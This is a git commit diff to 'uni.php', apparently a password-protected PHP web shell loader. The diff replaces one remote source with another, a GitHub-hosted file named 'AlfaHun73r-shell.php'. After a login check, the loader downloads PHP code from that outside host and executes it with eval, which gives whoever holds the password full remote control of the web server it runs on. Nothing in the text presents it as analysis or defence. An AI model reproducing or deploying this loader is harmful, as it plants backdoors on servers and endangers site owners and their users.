65d34456ed6b282cffd4f8a27043c8b6a22024eb
1llsion <156107986+1llsion@users.noreply.github.com>
2024-03-05 15:01:30 -0800

    Update uni.php

--- uni.php
+++ uni.php
@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-  $a = geturlsinfo('https://marslogs.co.id/shell/shell/ndasbajul.txt');
+  $a = geturlsinfo('https://raw.githubusercontent.com/1llsion/shell/main/AlfaHun73r-shell.php');
   eval('?>' . $a);
 } else {
   // Display login form if not logged in
